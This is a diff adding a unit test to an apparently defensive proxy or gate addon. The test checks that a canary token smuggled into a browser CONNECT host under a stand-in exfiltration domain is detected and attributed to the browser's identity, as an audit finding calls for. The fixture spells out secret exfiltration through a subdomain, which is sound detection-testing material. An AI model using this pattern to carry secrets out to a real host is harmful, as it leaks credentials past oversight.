@@ -513,3 +513,14 @@ def test_ws_limits_from_env_for_the_browser():
     for browser in (False, True):  # an explicit lifetime applies to both
         w = pol.WsLimits.from_env(env, browser=browser)
         assert (w.max_seconds, w.msgs_per_min, w.max_bytes) == (90.0, 3, pol.WsLimits().max_bytes)
+
+
+def test_a_canary_in_the_browsers_connect_host_carries_the_loaded_identity(addon, tmp_path):
+    """Audit F3: at CONNECT the request hook has not tagged the flow yet; the browser's loaded identity is used."""
+    g = _gate(addon, tmp_path)
+    _load_browser(tmp_path)
+    f = _http(f"https://{TOKEN.lower()}.exfil.example.net/", "CONNECT", peer=BROWSER_IP)
+    f.request.port = 443
+    g._canary(f, "request-url", f.request.host, url=f"{f.request.host}:443")
+    (ev,) = _canary(tmp_path)
+    assert (ev["client"], ev["identity"], ev["where"]) == ("browser", "user-a", "request-url")
